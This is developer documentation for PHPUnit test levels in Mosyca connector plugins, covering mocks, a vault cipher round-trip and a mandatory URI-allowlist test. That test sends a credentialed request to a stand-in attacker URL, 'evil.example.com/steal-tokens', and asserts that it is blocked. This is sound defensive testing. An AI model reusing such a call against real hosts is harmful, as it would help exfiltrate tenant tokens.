# Testing Connector Plugins

This document defines the four test levels for Mosyca connector plugins, the fixture strategy for
each level, and the mandatory tests that every plugin must include.

All patterns shown here are verified in `mosyca/plugin-demo/tests/`.

---

## Test Levels

| Level | What boots | HTTP | DB | Example |
|---|---|---|---|---|
| 1 — Unit (actions) | Nothing | Mocked `HttpBinClient` | None | `FetchProtectedActionTest` |
| 2 — Unit (client) | Nothing | `MockHttpClient` | None | `HttpBinClientTest` |
| 3 — Integration | Nothing | `MockHttpClient` | Mocked repo | `VaultProvisioningTest` |
| 4 — E2E smoke | DDEV | Real HTTP | Real DB | Optional, `@smoke` tagged |

---

## Level 1: Action Unit Tests

Mock the client wrapper. Assert on `ActionResult` shape and security constraints.

```php
final class FetchProtectedActionTest extends TestCase
{
    /** @var HttpBinClient&MockObject */
    private HttpBinClient $client;
    /** @var VaultManager&MockObject */
    private VaultManager $vault;
    private FetchProtectedAction $action;

    protected function setUp(): void
    {
        $this->client = $this->createMock(HttpBinClient::class);
        $this->vault  = $this->createMock(VaultManager::class);
        $this->action = new FetchProtectedAction($this->client, $this->vault);
    }

    public function testReturnsAuthRequiredWhenNoCredentials(): void
    {
        $this->vault->method('retrieveSecret')
            ->willThrowException(SecretNotFoundException::forContext('tenant-1', 'demo_api'));

        $context = $this->createMock(ExecutionContextInterface::class);
        $context->method('getTenantId')->willReturn('tenant-1');

        $result = $this->action->execute([], $context);

        self::assertFalse($result->success);
        self::assertSame('AUTH_REQUIRED', $result->errorCode);
    }

    // MANDATORY — Security Rule SR2
    public function testResultDataNeverContainsToken(): void
    {
        $this->vault->method('retrieveSecret')->willReturn(['token' => 'secret']);
        $this->client->method('fetchProtected')
            ->willReturn(['authenticated' => true, 'token' => 'secret']); // API echoes it

        $context = $this->createMock(ExecutionContextInterface::class);
        $context->method('getTenantId')->willReturn('tenant-1');
        $context->method('getUserId')->willReturn(null);

        $result = $this->action->execute([], $context);
        $data   = (array) $result->data;

        self::assertArrayNotHasKey('token', $data);
        self::assertArrayNotHasKey('access_token', $data);
    }
}
```

**Vault Rule V3:** Use `createMock(VaultManager::class)` in unit tests. Never construct a real
`VaultManager` with a cipher in unit tests — that belongs in integration tests.

**Client class must NOT be `final`** — PHPUnit cannot mock final classes. Keep action-level client
wrappers non-final.

---

## Level 2: Client Unit Tests — MockHttpClient

Test the actual HTTP wire behavior: auth header injection, URI allowlist, JSON decode.

```php
final class HttpBinClientTest extends TestCase
{
    private const ALLOWED_URIS = ['demo_api' => ['https://httpbin.org/']];

    protected function setUp(): void
    {
        $this->vault = $this->createMock(VaultManager::class);
    }

    private function makeClient(MockHttpClient $inner): HttpBinClient
    {
        return new HttpBinClient(
            new VaultAwareHttpClient($inner, $this->vault, self::ALLOWED_URIS)
        );
    }
}
```

### Mandatory: Negative URI Allowlist Test (Security Rule SR1)

Every connector client test file MUST include this test. It verifies that `VaultAwareHttpClient`
rejects out-of-scope URIs before any vault access occurs.

```php
public function testOutOfScopeUriIsRejected(): void
{
    $inner = new MockHttpClient(new MockResponse('{}', ['http_code' => 200]));

    // Vault must never be accessed when the URI is blocked.
    $this->vault->expects(self::never())->method('retrieveSecret');

    $this->expectException(UriNotAllowedException::class);

    $vaultClient = new VaultAwareHttpClient($inner, $this->vault, self::ALLOWED_URIS);
    $vaultClient->request('GET', 'https://evil.example.com/steal-tokens', [
        'extra' => ['vault' => ['integration' => 'demo_api', 'tenant_id' => 'tenant-1']],
    ]);
}
```

### Extracting the Authorization Header from MockHttpClient

```php
private static function extractAuthHeader(array $options): ?string
{
    // After MockHttpClient::prepareRequest(), headers are a flat array of "Name: value" strings.
    foreach ($options['headers'] ?? [] as $header) {
        if (!is_string($header)) { continue; }
        if (0 === stripos($header, 'authorization:')) {
            return ltrim(substr($header, strlen('authorization:')));
        }
    }
    return null;
}
```

Use this in a callback-based MockHttpClient to assert token injection:

```php
$capturedAuth = null;
$inner = new MockHttpClient(
    static function (string $method, string $url, array $options) use (&$capturedAuth): MockResponse {
        $capturedAuth = self::extractAuthHeader($options);
        return new MockResponse('{"authenticated":true}', ['http_code' => 200]);
    }
);

$this->vault->method('retrieveSecret')->willReturn(['token' => 'my-token']);
$this->makeClient($inner)->fetchProtected('tenant-1', null);

self::assertSame('Bearer my-token', $capturedAuth);
```

---

## Level 3: Integration Tests — Real Cipher, No Kernel Boot

Verify the full encryption → decryption chain without Doctrine or a Symfony kernel. Mock only the
repository. Use a real `SodiumSecretCipher` with a test-generated key.

```php
final class VaultProvisioningTest extends TestCase
{
    protected function setUp(): void
    {
        // Vault Rule V3: fresh random key per test run. NEVER MOSYCA_VAULT_MASTER_KEY.
        $testKey = bin2hex(random_bytes(SODIUM_CRYPTO_SECRETBOX_KEYBYTES)); // 64 hex chars

        $this->cipher     = new SodiumSecretCipher($testKey);
        $this->repository = $this->createMock(VaultSecretRepository::class);
        $this->vault      = new VaultManager($this->repository, $this->cipher);
    }

    public function testVaultRoundTrip(): void
    {
        $stored = null;

        $this->repository->method('findByContext')
            ->willReturnCallback(static function () use (&$stored): ?VaultSecret { return $stored; });

        $this->repository->method('save')
            ->willReturnCallback(static function (VaultSecret $s) use (&$stored): void { $stored = $s; });

        $this->vault->storeSecret('tenant-1', 'demo_api', ['token' => 'my-token']);
        $retrieved = $this->vault->retrieveSecret('tenant-1', 'demo_api');

        self::assertSame('my-token', $retrieved['token']);
    }
}
```

**Important:** Use `static function () use (&$stored)` (reference capture), NOT an arrow function
`fn () => $stored` (value capture). Arrow functions capture the variable's value at definition time,
so a later assignment to `$stored` in `save` would not be visible in `findByContext`.

---

## Level 4: E2E Smoke Tests (Optional)

Smoke tests require a real sandbox API account and real DDEV environment.

```php
/**
 * @group smoke
 */
final class HttpBinSmokeTest extends TestCase
{
    protected function setUp(): void
    {
        if (!getenv('MOSYCA_SMOKE_TEST')) {
            $this->markTestSkipped('Smoke tests require MOSYCA_SMOKE_TEST=1');
        }
    }

    public function testRealHttpBinCall(): void
    {
        // Uses real SodiumSecretCipher + real HTTP client
        // ...
    }
}
```

Run with: `MOSYCA_SMOKE_TEST=1 vendor/bin/phpunit --group smoke`

CI should skip smoke tests by default. They run manually or in a dedicated CI stage with secrets.

---

## DummySecretCipher: When to Use It

`DummySecretCipher` is available only for unit tests that need a cipher but don't care about real
encryption:

```php
use Mosyca\Core\Vault\Cipher\DummySecretCipher;

$vault = new VaultManager($repository, new DummySecretCipher());
```

`DummySecretCipher::encrypt(string $plaintext): string` simply returns the base64 of the plaintext.
`DummySecretCipher::decrypt(string $ciphertext): string` reverses it.

Use `DummySecretCipher` when: you're testing VaultManager logic that doesn't depend on real crypto.
Use `SodiumSecretCipher` with a test key when: you're testing that the full encryption round-trip
works correctly (integration tests).

---

→ Next: [04_dx_checklist.md](04_dx_checklist.md)
